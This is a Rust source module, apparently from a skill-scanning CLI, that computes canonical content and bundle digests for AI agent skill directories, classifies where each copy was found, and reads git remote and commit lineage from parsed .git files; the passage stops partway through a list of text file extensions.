//! Content identity for scanned assets (#274, #130).
//!
//! Provides a canonical content digest for a skill directory, provenance for
//! each location a copy was found in, and lineage metadata (git remote and
//! HEAD commit) read directly from `.git` files — no subprocesses, no network.
//!
//! The digest replicates the hub's `computeCanonicalSkillHash()`
//! (AgenticHighway/vettd `packages/api/src/skills/skill-hash.ts`): SHA-256 over
//! the JSON serialization of `[path, content]` pairs sorted bytewise by path.
//! Keeping both sides on one formula gives the CLI and the dashboard a single
//! canonical asset identity. Escaping is identical for ASCII content; non-ASCII
//! text may serialize differently (JS escapes U+2028/U+2029, serde does not).

use sha2::{Digest, Sha256};
use std::collections::HashMap;
use std::fs;
use std::io::Read;
use std::path::{Path, PathBuf};

/// Parity with the server-side GitHub fetcher limits (vettd-cli#204): 250 text
/// files and 10 MB of total text content.
pub(crate) const MAX_SKILL_FILES: usize = 250;
pub(crate) const MAX_SKILL_TOTAL_BYTES: u64 = 10 * 1024 * 1024;
/// Hard stop for the directory walk so a pathological tree cannot hang a scan.
/// Enforced per visited entry, directories included, inside the walk loop.
pub(crate) const WALK_SAFETY_LIMIT: usize = 10_000;
/// Upper bound on the bytes hashed for a single bundle entry. A larger entry
/// cannot be vouched for by the bundle digest, so the digest is omitted.
const MAX_BUNDLE_ENTRY_BYTES: u64 = 64 * 1024 * 1024;

/// Directories excluded from identity: version-control metadata.
const VCS_DIRS: [&str; 3] = [".git", ".hg", ".svn"];
/// Files excluded from identity: operating-system junk.
const OS_JUNK: [&str; 3] = [".DS_Store", "Thumbs.db", "desktop.ini"];
/// Path markers that make a home-directory location a user "installed" asset.
const INSTALLED_MARKERS: [&str; 6] = [
    ".claude/", ".codex/", ".cursor/", ".vscode/", ".config/", ".agents/",
];
/// Upper bound on a `.gitignore` this loader will read. Rules from a larger
/// file would only ever exclude more, so a truncated read stays conservative.
const MAX_IGNORE_FILE_BYTES: u64 = 1024 * 1024;
/// Maximum directory nesting either walk follows. No skill bundle is nested
/// this deeply, and unbounded recursion risks exhausting the stack (#315/N5).
const MAX_WALK_DEPTH: usize = 64;

/// Open a file for reading without blocking and without following a final
/// symlink.
///
/// The returned descriptor is only handed out for a regular file: the check
/// runs on the *opened* descriptor, so a regular file swapped for a FIFO
/// between the `file_type()` check and this open cannot block the scan
/// waiting for a writer (#315/N2).
fn open_regular_file(path: &Path) -> Option<fs::File> {
    let mut options = fs::OpenOptions::new();
    options.read(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        options.custom_flags(libc::O_NONBLOCK | libc::O_NOFOLLOW);
    }
    let file = options.open(path).ok()?;
    if !file.metadata().is_ok_and(|m| m.is_file()) {
        return None;
    }
    Some(file)
}

/// Outcome of one bounded text read.
enum TextRead {
    Text(String),
    /// The file holds more bytes than the caller allows.
    TooLarge,
    /// Not a regular file, not valid UTF-8, or not readable.
    Unreadable,
}

/// Read at most `limit` bytes from a regular file, through a bounded reader.
///
/// Reads one byte past the bound to tell "exactly at the limit" from "over it",
/// so a caller never silently analyzes a truncated prefix.
fn read_text_file(path: &Path, limit: u64) -> TextRead {
    let Some(file) = open_regular_file(path) else {
        return TextRead::Unreadable;
    };
    let mut bytes = Vec::new();
    let mut limited = file.take(limit.saturating_add(1));
    if limited.read_to_end(&mut bytes).is_err() {
        return TextRead::Unreadable;
    }
    if bytes.len() as u64 > limit {
        return TextRead::TooLarge;
    }
    match String::from_utf8(bytes) {
        Ok(text) => TextRead::Text(text),
        Err(_) => TextRead::Unreadable,
    }
}

/// Result of loading a skill directory for scanning and identity.
pub(crate) struct SkillFileLoad {
    /// Text files included in the scan and the digest, keyed by relative path.
    pub text_files: HashMap<String, String>,
    /// Every included file path (relative), including non-text files.
    pub all_paths: Vec<String>,
    /// Text-extension files that could not be decoded — reported, never silent.
    pub skipped: Vec<String>,
    /// Paths dropped from identity (VCS dirs, OS junk, own .gitignore matches).
    pub excluded: Vec<String>,
    /// True when the load fell short of the whole skill: a walk/size/count cap,
    /// an unreadable entry or directory, or an unhashable bundle entry.
    pub partial: bool,
    /// Stable reason codes for every way this load fell short of the whole
    /// skill (#314): `file-cap`, `size-cap`, `file-unreadable`,
    /// `unreadable-directory`, `unanalyzed-content`. Sorted, deduplicated;
    /// empty when complete.
    pub incomplete_reasons: Vec<&'static str>,
    /// Digest over every byte under the root (see [`bundle_digest`]); `None`
    /// when some entry could not be read, so it can never vouch for bytes it
    /// did not see (#315).
    pub bundle_digest: Option<String>,
    /// Digest of the loader state that shapes the assessment but not the
    /// content hashes: every entry's path, kind and exec bit, plus how the load
    /// fell short. A cached assessment is only reusable when this matches too,
    /// because a chmod alone can turn inert content into unanalyzed risk
    /// (#314/N1).
    pub assessment_fingerprint: String,
}

/// Walk a skill directory deterministically, apply disclosed exclusions, and
/// load full text content under the server-parity caps.
pub(crate) fn load_skill_files(root: &Path) -> SkillFileLoad {
    load_skill_files_with_walk_limit(root, WALK_SAFETY_LIMIT)
}

/// [`load_skill_files`] with an injectable walk budget, so the cap behaviour is
/// testable without building a ten-thousand-entry tree.
fn load_skill_files_with_walk_limit(root: &Path, walk_limit: usize) -> SkillFileLoad {
    load_skill_files_with(root, walk_limit, &|| {})
}

/// [`load_skill_files_with_walk_limit`] with a seam between the analysis read
/// and the bundle walk. Production passes a no-op; a test uses it to mutate the
/// tree at exactly the point where the two passes used to read independently
/// (#315/N3).
fn load_skill_files_with(
    root: &Path,
    walk_limit: usize,
    between_phases: &dyn Fn(),
) -> SkillFileLoad {
    let mut walk = AnalysisWalk {
        files: Vec::new(),
        excluded: Vec::new(),
        skipped: Vec::new(),
        rules: Vec::new(),
        partial: false,
        depth_capped: false,
        budget: WalkBudget::new(walk_limit),
    };
    collect_files(root, "", 0, &mut walk);
    let mut files = walk.files;
    let mut excluded = walk.excluded;
    let mut skipped = walk.skipped;
    let mut partial = walk.partial;
    let budget = walk.budget;
    files.sort();
    excluded.sort();
    skipped.sort();

    // Record the cap before truncating: checking afterwards is always false.
    let mut file_cap = budget.capped || walk.depth_capped;
    if files.len() > walk_limit {
        partial = true;
        file_cap = true;
        files.truncate(walk_limit);
    }

    let mut size_cap = false;
    let mut text_files: HashMap<String, String> = HashMap::new();
    // SHA-256 of the bytes actually analyzed, per path. The bundle walk reuses
    // it instead of reopening the file, so the identity and the scan can never
    // describe two different versions of the same file (#315/N3).
    let mut analyzed_hashes: HashMap<String, String> = HashMap::new();
    let mut total_bytes: u64 = 0;
    for rel in &files {
        if !is_likely_text(Path::new(rel)) {
            continue;
        }
        if text_files.len() >= MAX_SKILL_FILES {
            partial = true;
            file_cap = true;
            continue;
        }
        // One bounded, non-blocking read: the cap is enforced on the bytes read
        // rather than on a separate stat, so a file that grows cannot blow up
        // memory before the cap is noticed.
        let remaining = MAX_SKILL_TOTAL_BYTES.saturating_sub(total_bytes);
        match read_text_file(&root.join(rel), remaining) {
            TextRead::Text(content) => {
                let mut hasher = Sha256::new();
                hasher.update(content.as_bytes());
                analyzed_hashes.insert(rel.clone(), format!("{:x}", hasher.finalize()));
                total_bytes += content.len() as u64;
                text_files.insert(rel.clone(), content);
            }
            TextRead::TooLarge => {
                partial = true;
                size_cap = true;
            }
            TextRead::Unreadable => skipped.push(rel.clone()),
        }
    }

    let mut incomplete_reasons: Vec<&'static str> = Vec::new();
    if file_cap {
        incomplete_reasons.push("file-cap");
    }
    if size_cap {
        incomplete_reasons.push("size-cap");
    }
    for entry in &skipped {
        incomplete_reasons.push(if entry.ends_with(UNREADABLE_DIR_SUFFIX) {
            "unreadable-directory"
        } else {
            "file-unreadable"
        });
    }
    between_phases();
    let bundle = walk_bundle(root, walk_limit, &analyzed_hashes);
    // The bundle walk stopping short means the digest could not cover every
    // byte, which is itself an incomplete analysis on top of any scan cap.
    if bundle.capped {
        partial = true;
        incomplete_reasons.push("file-cap");
    }
    if bundle.oversize {
        partial = true;
        incomplete_reasons.push("size-cap");
    }
    // Excluded content must not gain trust by being excluded (#315): risky
    // entries the scanner never saw make the assessment partial.
    let analyzed: std::collections::HashSet<&str> = files.iter().map(String::as_str).collect();
    let unanalyzed_risky = bundle.entries.iter().any(|entry| {
        let name = entry.path.rsplit('/').next().unwrap_or(&entry.path);
        // Classify the entry kind before exempting inert OS junk: a symlink
        // named `.DS_Store` is still a symlink (#314/#315).
        match entry.kind {
            // Symlinks and special entries are never followed or analyzed.
            BundleEntryKind::Symlink | BundleEntryKind::Special => true,
            // Already disclosed as `file-unreadable`.
            BundleEntryKind::Unreadable => false,
            BundleEntryKind::File => {
                let analyzed_text = analyzed.contains(entry.path.as_str())
                    && is_likely_text(Path::new(&entry.path));
                if !analyzed_text && (entry.executable || is_executable_extension(&entry.path)) {
                    return true;
                }
                // Only a genuinely inert junk *file* is exempt.
                if OS_JUNK.iter().any(|junk| junk.eq_ignore_ascii_case(name)) {
                    return false;
                }
                // Not in the analyzed set: gitignored.
                !analyzed.contains(entry.path.as_str())
            }
        }
    });
    if unanalyzed_risky {
        incomplete_reasons.push("unanalyzed-content");
    }
    if bundle.unreadable {
        partial = true;
        incomplete_reasons.push("file-unreadable");
    }
    incomplete_reasons.sort_unstable();
    incomplete_reasons.dedup();
    debug_assert!(
        !partial || !incomplete_reasons.is_empty(),
        "a partial load must name why it fell short"
    );

    SkillFileLoad {
        text_files,
        all_paths: files,
        skipped,
        excluded,
        partial,
        incomplete_reasons: incomplete_reasons.clone(),
        bundle_digest: bundle.digest,
        assessment_fingerprint: assessment_fingerprint(
            &bundle.entries,
            &incomplete_reasons,
            partial,
        ),
    }
}

/// Digest of everything that shapes an assessment without moving a content
/// hash: each bundle entry's path, kind and exec bit, plus the reason list.
///
/// Two loads with equal content hashes but a different fingerprint assess
/// differently, so a cached assessment must not be reused across them
/// (#314/N1).
fn assessment_fingerprint(
    entries: &[BundleEntry],
    reasons: &[&'static str],
    partial: bool,
) -> String {
    let mut rows: Vec<(&str, &'static str, bool)> = entries
        .iter()
        .map(|entry| {
            (
                entry.path.as_str(),
                entry_kind_name(entry.kind),
                entry.executable,
            )
        })
        .collect();
    rows.sort_unstable();
    let state = serde_json::json!({
        "entries": rows,
        "reasons": reasons,
        "partial": partial,
    });
    format!("{:x}", Sha256::digest(state.to_string().as_bytes()))
}

fn entry_kind_name(kind: BundleEntryKind) -> &'static str {
    match kind {
        BundleEntryKind::File => "file",
        BundleEntryKind::Symlink => "symlink",
        BundleEntryKind::Special => "special",
        BundleEntryKind::Unreadable => "unreadable",
    }
}

/// Per-entry budget shared by one walk. Counts directories too, so a
/// file-free tree cannot walk forever (#315/P2).
struct WalkBudget {
    limit: usize,
    visited: usize,
    capped: bool,
}

impl WalkBudget {
    fn new(limit: usize) -> Self {
        Self {
            limit,
            visited: 0,
            capped: false,
        }
    }

    /// Claim one entry of the budget. `false` means the budget is exhausted.
    fn claim(&mut self) -> bool {
        if self.visited >= self.limit {
            self.capped = true;
            return false;
        }
        self.visited += 1;
        true
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum BundleEntryKind {
    File,
    Symlink,
    /// FIFO, socket, device node: never opened, never hashed.
    Special,
    Unreadable,
}

struct BundleEntry {
    /// Root-relative path, `/`-separated on every platform.
    path: String,
    kind: BundleEntryKind,
    /// Unix exec bit. Used only to classify risk, never hashed: Windows cannot
    /// observe it, and the digest must be the same on every platform.
    executable: bool,
}

struct BundleWalk {
    entries: Vec<BundleEntry>,
    digest: Option<String>,
    unreadable: bool,
    /// Some entry was larger than the hash bound.
    oversize: bool,
    /// The walk ran out of entry budget.
    capped: bool,
}

/// Walk every entry under `root` except VCS metadata, without the .gitignore,
/// OS-junk, text-extension, or size filters the scan applies, and digest it.
///
/// `bundleDigest` (#315): SHA-256 over the JSON array of `[path, kind, value]`
/// sorted bytewise by path, where `kind` is `file` (value: SHA-256 hex of the
/// raw bytes) or `symlink` (value: link target, `/`-separated, not followed).
/// File modes are excluded so the digest is stable across platforms. Symlink
/// targets are kept exactly as the filesystem reports them (only Windows path
/// separators are normalized), so a literal backslash never aliases a
/// separator. `None` when any entry was unreadable, too large, or the walk hit
/// the entry budget: the digest must never vouch for bytes it did not see.
fn walk_bundle(root: &Path, walk_limit: usize, analyzed: &HashMap<String, String>) -> BundleWalk {
    let mut walk = BundleWalk {
        entries: Vec::new(),
        digest: None,
        unreadable: false,
        oversize: false,
        capped: false,
    };
    let mut records: Vec<(String, &'static str, String)> = Vec::new();
    let mut budget = WalkBudget::new(walk_limit);
    walk_bundle_dir(root, "", 0, &mut walk, &mut records, &mut budget, analyzed);
    walk.capped |= budget.capped;
    if walk.unreadable || walk.oversize || walk.capped {
        return walk;
    }
    records.sort_by(|a, b| a.0.as_bytes().cmp(b.0.as_bytes()));
    let serialized = serde_json::to_string(&records).unwrap_or_default();
    walk.digest = Some(format!("{:x}", Sha256::digest(serialized.as_bytes())));
    walk
}

fn walk_bundle_dir(
    dir: &Path,
    rel_prefix: &str,
    depth: usize,
    walk: &mut BundleWalk,
    records: &mut Vec<(String, &'static str, String)>,
    budget: &mut WalkBudget,
    analyzed: &HashMap<String, String>,
) {
    if depth > MAX_WALK_DEPTH {
        // Reported as `file-cap`: the contract's reason vocabulary is frozen at
        // 2.9.0, and this is a structural walk bound, not a content shortfall.
        walk.capped = true;
        return;
    }
    let Ok(read_dir) = fs::read_dir(dir) else {
        walk.unreadable = true;
        return;
    };
    for entry in read_dir {
        if !budget.claim() {
            return;
        }
        let Ok(entry) = entry else {
            walk.unreadable = true;
            continue;
        };
        // A non-UTF-8 name cannot be represented losslessly in the digest.
        let Some(name) = entry.file_name().to_str().map(str::to_string) else {
            walk.unreadable = true;
            continue;
        };
        let rel = if rel_prefix.is_empty() {
            name.clone()
        } else {
            format!("{rel_prefix}/{name}")
        };
        let Ok(file_type) = entry.file_type() else {
            walk.unreadable = true;
            walk.entries.push(BundleEntry {
                path: rel,
                kind: BundleEntryKind::Unreadable,
                executable: false,
            });
            continue;
        };
        if file_type.is_dir() {
            if !VCS_DIRS.contains(&name.as_str()) {
                walk_bundle_dir(
                    &entry.path(),
                    &rel,
                    depth + 1,
                    walk,
                    records,
                    budget,
                    analyzed,
                );
            }
        } else if file_type.is_symlink() {
            // Analyzed bytes were read from what used to be a regular file; a
            // symlink standing there now cannot be vouched for.
            if analyzed.contains_key(&rel) {
                walk.unreadable = true;
            }
            match symlink_target(&entry.path()) {
                Some(target) => {
                    records.push((rel.clone(), "symlink", target));
                    walk.entries.push(BundleEntry {
                        path: rel,
                        kind: BundleEntryKind::Symlink,
                        executable: false,
                    });
                }
                None => {
                    walk.unreadable = true;
                    walk.entries.push(BundleEntry {
                        path: rel,
                        kind: BundleEntryKind::Unreadable,
                        executable: false,
                    });
                }
            }
        } else if file_type.is_file() {
            // An analyzed file's hash comes from the bytes the scan actually
            // saw, never from a second read (#315/N3).
            let known = analyzed.get(&rel).cloned();
            let outcome = match known {
                Some(hash) => HashOutcome::Hashed(hash),
                None => hash_bundle_file(&entry.path()),
            };
            match outcome {
                HashOutcome::Hashed(hash) => {
                    records.push((rel.clone(), "file", hash));
                    walk.entries.push(BundleEntry {
                        executable: is_executable_mode(&entry),
                        path: rel,
                        kind: BundleEntryKind::File,
                    });
                }
                HashOutcome::TooLarge => {
                    walk.oversize = true;
                    walk.entries.push(BundleEntry {
                        executable: true,
                        path: rel,
                        kind: BundleEntryKind::File,
                    });
                }
                HashOutcome::Unreadable => {
                    walk.unreadable = true;
                    walk.entries.push(BundleEntry {
                        executable: true,
                        path: rel,
                        kind: BundleEntryKind::Unreadable,
                    });
                }
            }
        } else {
            // FIFO, socket, device node: opening a FIFO blocks until a writer
            // appears, so these are never opened. They cannot be hashed either,
            // which makes the digest unavailable (#315).
            walk.unreadable = true;
            walk.entries.push(BundleEntry {
                executable: true,
                path: rel,
                kind: BundleEntryKind::Special,
            });
        }
    }
}

/// The symlink's target, losslessly. `None` when the target cannot be
/// represented (invalid UTF-8) or cannot be read: the digest is then omitted
/// rather than collapsing two different targets onto one string.
fn symlink_target(path: &Path) -> Option<String> {
    let target = fs::read_link(path).ok()?;
    let target = target.to_str()?;
    #[cfg(windows)]
    let target = target.replace('\\', "/");
    Some(target.to_string())
}

enum HashOutcome {
    Hashed(String),
    TooLarge,
    Unreadable,
}

/// SHA-256 of a regular file's bytes, bounded. Opens without blocking and
/// without following a symlink, and checks the *opened* descriptor's type, so a
/// regular file swapped for a FIFO cannot hang the scan (#315/N2).
fn hash_bundle_file(path: &Path) -> HashOutcome {
    let Some(file) = open_regular_file(path) else {
        return HashOutcome::Unreadable;
    };
    if file
        .metadata()
        .is_ok_and(|m| m.len() > MAX_BUNDLE_ENTRY_BYTES)
    {
        return HashOutcome::TooLarge;
    }
    let mut hasher = Sha256::new();
    let mut limited = file.take(MAX_BUNDLE_ENTRY_BYTES + 1);
    if std::io::copy(&mut limited, &mut hasher).is_err() {
        return HashOutcome::Unreadable;
    }
    if limited.limit() == 0 {
        // The file grew past the bound while it was being read.
        return HashOutcome::TooLarge;
    }
    HashOutcome::Hashed(format!("{:x}", hasher.finalize()))
}

#[cfg(unix)]
fn is_executable_mode(entry: &fs::DirEntry) -> bool {
    use std::os::unix::fs::PermissionsExt;
    entry
        .metadata()
        .is_ok_and(|m| m.permissions().mode() & 0o111 != 0)
}

#[cfg(not(unix))]
fn is_executable_mode(_entry: &fs::DirEntry) -> bool {
    false
}

/// Extensions of executables and scripts the text scan does not decode.
fn is_executable_extension(path: &str) -> bool {
    let Some(extension) = Path::new(path).extension().and_then(|e| e.to_str()) else {
        return false;
    };
    matches!(
        extension.to_ascii_lowercase().as_str(),
        "exe"
            | "dll"
            | "so"
            | "dylib"
            | "bin"
            | "com"
            | "scr"
            | "msi"
            | "app"
            | "appimage"
            | "deb"
            | "rpm"
            | "apk"
            | "jar"
            | "class"
            | "wasm"
            | "pyc"
            | "ps1"
            | "psm1"
            | "bat"
            | "cmd"
            | "vbs"
            | "fish"
            | "pl"
            | "lua"
            | "r"
            | "scpt"
    )
}

const UNREADABLE_DIR_SUFFIX: &str = "(unreadable directory)";

/// Canonical content digest over a text-file map, matching the hub's
/// `computeCanonicalSkillHash`: entries sorted bytewise by path, serialized as
/// a JSON array of `[path, content]` pairs, hashed with SHA-256.
pub(crate) fn canonical_digest(text_files: &HashMap<String, String>) -> String {
    let mut entries: Vec<(&String, &String)> = text_files.iter().collect();
    entries.sort_by(|a, b| a.0.as_bytes().cmp(b.0.as_bytes()));
    let serialized = serde_json::to_string(&entries).unwrap_or_default();
    let mut hasher = Sha256::new();
    hasher.update(serialized.as_bytes());
    format!("{:x}", hasher.finalize())
}

/// Classify where a found copy lives. One ordered rules table (#274).
///
/// Only the real recycle/trash locations map to `trash`; a path that merely
/// contains a `tmp` component (e.g. `/home/u/proj/tmp/x`) is not trash.
/// Installed copies are detected before caches so agent plugin installs that
/// live under a `cache/` directory (e.g. `~/.claude/plugins/cache/...`)
/// classify as `installed` rather than `cache`.
pub(crate) fn provenance_for(path: &str) -> &'static str {
    let normalized = path.replace('\\', "/");
    let lower = normalized.to_lowercase();
    if lower.contains("/.trash/")
        || lower.ends_with("/.trash")
        || lower.contains("/.local/share/trash/")
        || lower.contains("/$recycle.bin/")
    {
        return "trash";
    }
    if let Some(home) = home_dir_normalized() {
        let home_lower = home.to_lowercase();
        let under_home = lower == home_lower
            || (lower.starts_with(&home_lower)
                && lower.as_bytes().get(home_lower.len()) == Some(&b'/'));
        if under_home && INSTALLED_MARKERS.iter().any(|m| lower.contains(m)) {
            return "installed";
        }
    }
    if lower.contains("/.cache/") || lower.contains("/cache/") || lower.contains("/caches/") {
        return "cache";
    }
    if lower.contains("/node_modules/")
        || lower.contains("/vendor/")
        || lower.contains("/site-packages/")
        || lower.contains("/pods/")
        || lower.contains("/target/")
    {
        return "vendored";
    }
    "bundled"
}

/// Cross-platform home directory normalized to forward slashes, so the
/// `installed` rule also fires on Windows (where `$HOME` is unset).
fn home_dir_normalized() -> Option<String> {
    dirs::home_dir()
        .or_else(|| std::env::var_os("HOME").map(std::path::PathBuf::from))
        .map(|home| home.to_string_lossy().replace('\\', "/"))
        .filter(|home| !home.is_empty())
}

/// Lineage metadata for relating copies of the same asset across versions.
#[derive(Debug, Clone, Default)]
pub(crate) struct AssetLineage {
    pub git_remote_url: Option<String>,
    pub git_commit: Option<String>,
}

/// Read lineage from the nearest enclosing `.git` directory (files only).
///
/// Only a path the enclosing repository actually tracks inherits its remote
/// and commit: an archive export, copy, or unrelated bundle that merely sits
/// under a checkout must not be attributed to that repository (vettd#1216).
/// Tracking is read from the repository's own index; an index this reader
/// cannot parse yields no lineage (fail closed).
pub(crate) fn lineage_for(path: &Path) -> AssetLineage {
    let Some((work_root, git_dir)) = find_git_dir(path) else {
        return AssetLineage::default();
    };
    if !is_tracked(&work_root, &git_dir, path) {
        return AssetLineage::default();
    }
    AssetLineage {
        git_remote_url: read_git_remote(&git_dir),
        git_commit: read_git_head_commit(&git_dir),
    }
}

/// Whether `path` (a file, or a directory containing tracked files) is in
/// the index of the repository rooted at `work_root`.
///
/// The comparison is component-wise on the path as the filesystem reports it,
/// so a literal backslash in a Unix file name never compares equal to a `/`
/// separator (#1216). A path that cannot be represented losslessly (invalid
/// UTF-8) is not matched: the caller fails closed rather than guessing.
pub(super) fn is_tracked(work_root: &Path, git_dir: &Path, path: &Path) -> bool {
    let Ok(rel) = path.strip_prefix(work_root) else {
        return false;
    };
    let Some(rel) = native_git_relative_path(rel) else {
        return false;
    };
    let dir_prefix = format!("{rel}/");
    // The index must parse even for the work-tree root: an unreadable index
    // grants nothing (fail closed).
    index_paths(git_dir).is_some_and(|paths| {
        rel.is_empty()
            || paths
                .iter()
                .any(|p| p == &rel || p.starts_with(&dir_prefix))
    })
}

/// Render a path relative to a work tree the way a Git index does.
///
/// On Unix this is the bytes the filesystem reports, with no separator
/// rewriting; `None` when the name is not valid UTF-8, because a lossy
/// conversion could alias two different names.
fn native_git_relative_path(rel: &Path) -> Option<String> {
    let rel = rel.to_str()?;
    #[cfg(windows)]
    {
        // Windows uses `\` natively; the index always uses `/`.
        Some(rel.replace('\\', "/"))
    }
    #[cfg(not(windows))]
    {
        Some(rel.to_string())
    }
}

/// Index extensions this reader understands well enough to skip. Any other
/// *required* extension (one whose signature does not start with an uppercase
/// byte) means the index is not safe to trust.
const KNOWN_INDEX_EXTENSIONS: [&[u8; 4]; 8] = [
    b"TREE", b"REUC", b"UNTR", b"FSMN", b"EOIE", b"IEOT", b"link", b"sdir",
];

/// Entry paths from a git index (`DIRC`, versions 2 and 3). Version 4
/// (prefix-compressed paths) and anything structurally invalid return `None`:
/// entry padding, the extension section, and the trailing SHA-1 checksum are
/// all validated before any path is trusted.
fn index_paths(git_dir: &Path) -> Option<Vec<String>> {
    let data = fs::read(git_dir.join("index")).ok()?;
    if data.get(0..4)? != b"DIRC" {
        return None;
    }
    let version = u32::from_be_bytes(data.get(4..8)?.try_into().ok()?);
    if version != 2 && version != 3 {
        return None;
    }
    let count = u32::from_be_bytes(data.get(8..12)?.try_into().ok()?);
    // The trailer is a SHA-1 over everything before it.
    let body_end = data.len().checked_sub(20)?;
    if body_end < 12 {
        return None;
    }
    let mut paths = Vec::new();
    let mut pos = 12usize;
    for _ in 0..count {
        // 40 bytes of stat data + 20-byte object id, then 16-bit flags.
        let flags_at = pos.checked_add(60)?;
        let flags = u16::from_be_bytes(data.get(flags_at..flags_at + 2)?.try_into().ok()?);
        let mut name_at = flags_at + 2;
        if flags & 0x4000 != 0 {
            if version < 3 {
                return None;
            }
            name_at += 2;
        }
        let nul = data.get(name_at..body_end)?.iter().position(|&b| b == 0)?;
        let name_end = name_at + nul;
        // A path the index cannot represent losslessly is not trusted.
        let name = String::from_utf8(data.get(name_at..name_end)?.to_vec()).ok()?;
        // The low 12 bits declare the path length (vettd#1216/N4). Git writes
        // `0xfff` for any name at least that long; every other entry must agree
        // with the length actually delimited by the NUL, or the entry boundaries
        // this reader derives are not the ones git wrote.
        let declared_len = usize::from(flags & 0x0fff);
        let length_ok = if declared_len == 0x0fff {
            name.len() >= 0x0fff
        } else {
            declared_len == name.len()
        };
        if !length_ok {
            return None;
        }
        // Entries are NUL-padded (at least one NUL) to a multiple of 8 bytes.
        let entry_len = (name_end - pos + 1).div_ceil(8) * 8;
        let entry_end = pos.checked_add(entry_len)?;
        if entry_end > body_end || entry_len % 8 != 0 {
            return None;
        }
        // Every padding byte between the name and the next entry is NUL.
        if data.get(name_end..entry_end)?.iter().any(|&b| b != 0) {
            return None;
        }
        paths.push(name);
        pos = entry_end;
    }
    // Optional extension headers must tile the gap up to the trailer exactly.
    while pos < body_end {
        let header = data.get(pos..pos + 8)?;
        let signature: [u8; 4] = header[0..4].try_into().ok()?;
        let size = u32::from_be_bytes(header[4..8].try_into().ok()?) as usize;
        pos = pos.checked_add(8)?.checked_add(size)?;
        if pos > body_end {
            return None;
        }
        // Extensions named with a leading uppercase byte are optional and may be
        // skipped. Anything else is a required extension this reader does not
        // understand, so the entry data it would rely on is not trustworthy
        // (vettd#1216/N4).
        if !KNOWN_INDEX_EXTENSIONS.contains(&&signature) && !signature[0].is_ascii_uppercase() {
            return None;
        }
    }
    if pos != body_end {
        return None;
    }
    // The checksum must match, or the entry data cannot be trusted.
    if data.get(body_end..)? != sha1_digest(data.get(..body_end)?).as_slice() {
        return None;
    }
    Some(paths)
}

fn sha1_digest(bytes: &[u8]) -> [u8; 20] {
    let mut hasher = sha1::Sha1::new();
    hasher.update(bytes);
    hasher.finalize().into()
}

/// Test fixture: a minimal git index (version 2) listing `paths`, laid out as
/// git writes it, trailer checksum included.
#[cfg(test)]
pub(crate) fn write_test_index(git_dir: &Path, paths: &[&str]) {
    let mut sorted = paths.to_vec();
    sorted.sort_unstable();
    let mut out = b"DIRC".to_vec();
    out.extend(2u32.to_be_bytes());
    out.extend((sorted.len() as u32).to_be_bytes());
    for path in sorted {
        let mut entry = vec![0u8; 60];
        entry.extend((path.len() as u16 & 0x0fff).to_be_bytes());
        entry.extend(path.as_bytes());
        entry.resize((62 + path.len() + 8) & !7, 0);
        out.extend(entry);
    }
    let checksum = sha1_digest(&out);
    out.extend(checksum);
    fs::write(git_dir.join("index"), out).unwrap();
}

/// The nearest enclosing work tree root and its git directory.
pub(super) fn find_git_dir(path: &Path) -> Option<(PathBuf, PathBuf)> {
    let mut current = if path.is_dir() {
        path.to_path_buf()
    } else {
        path.parent()?.to_path_buf()
    };
    loop {
        let candidate = current.join(".git");
        if candidate.is_dir() {
            return Some((current, candidate));
        }
        if candidate.is_file() {
            // Worktrees and submodules use a `.git` file pointing at the real
            // git directory via `gitdir: <path>`.
            if let Some(dir) = resolve_gitdir_file(&candidate) {
                return Some((current, dir));
            }
        }
        if !current.pop() {
            return None;
        }
    }
}

fn resolve_gitdir_file(git_file: &Path) -> Option<PathBuf> {
    let content = fs::read_to_string(git_file).ok()?;
    let rest = content.trim().strip_prefix("gitdir: ")?;
    let dir = Path::new(rest.trim());
    let dir = if dir.is_absolute() {
        dir.to_path_buf()
    } else {
        git_file.parent()?.join(dir)
    };
    dir.is_dir().then_some(dir)
}

/// For worktrees, shared config and packed-refs live in the common git dir
/// referenced by the worktree's `commondir` file.
fn commdir(git_dir: &Path) -> Option<PathBuf> {
    let raw = fs::read_to_string(git_dir.join("commondir")).ok()?;
    let dir = Path::new(raw.trim());
    let dir = if dir.is_absolute() {
        dir.to_path_buf()
    } else {
        git_dir.join(dir)
    };
    dir.is_dir().then_some(dir)
}

/// `<gitdir>/config` (or the worktree's common dir), sanitized.
pub(super) fn read_git_remote(git_dir: &Path) -> Option<String> {
    read_remote_from_config(git_dir)
        .or_else(|| commdir(git_dir).and_then(|c| read_remote_from_config(&c)))
}

fn read_remote_from_config(git_dir: &Path) -> Option<String> {
    let config = fs::read_to_string(git_dir.join("config")).ok()?;
    for line in config.lines() {
        if let Some((_, url)) = line.split_once("url = ") {
            let url = url.trim();
            if !url.is_empty() {
                return Some(super::helpers::sanitize_git_remote_url(url));
            }
        }
    }
    None
}

fn read_git_head_commit(git_dir: &Path) -> Option<String> {
    let head = fs::read_to_string(git_dir.join("HEAD")).ok()?;
    let head = head.trim();
    if let Some(rest) = head.strip_prefix("ref: ") {
        let refname = rest.trim();
        if let Ok(content) = fs::read_to_string(git_dir.join(refname)) {
            let sha = content.trim().to_string();
            if is_sha(&sha) {
                return Some(sha);
            }
        }
        return read_packed_ref(git_dir, refname)
            .or_else(|| commdir(git_dir).and_then(|c| read_packed_ref(&c, refname)));
    }
    if is_sha(head) {
        return Some(head.to_string());
    }
    None
}

fn read_packed_ref(git_dir: &Path, refname: &str) -> Option<String> {
    let content = fs::read_to_string(git_dir.join("packed-refs")).ok()?;
    for line in content.lines() {
        if line.starts_with('#') || line.starts_with('^') {
            continue;
        }
        if let Some((sha, r#ref)) = line.split_once(' ') {
            if r#ref.trim() == refname && is_sha(sha) {
                return Some(sha.to_string());
            }
        }
    }
    None
}

fn is_sha(value: &str) -> bool {
    value.len() == 40 && value.bytes().all(|b| b.is_ascii_hexdigit())
}

/// Extension heuristic for "is this a text file we should scan and hash".
pub(crate) fn is_likely_text(path: &Path) -> bool {
    let Some(extension) = path.extension().and_then(|e| e.to_str()) else {
        // Extension-less files (Dockerfile, Makefile, LICENSE) are text.
        return true;
    };
    matches!(
        extension.to_ascii_lowercase().as_str(),
        "md" | "txt"
            | "json"
            | "yaml"
            | "yml"
            | "toml"
            | "sh"
            | "bash"
            | "zsh"
            | "py"
            | "js"
            | "ts"
            | "mjs"
            | "cjs"
            | "rs"
            | "go"
            | "rb"
            | "php"
            | "java"
            | "kt"
            | "swift"
            | "c"
            | "cpp"
            | "h"
            | "cs"
            | "html"
            | "xml"
            | "css"
            | "sql"
            | "env"
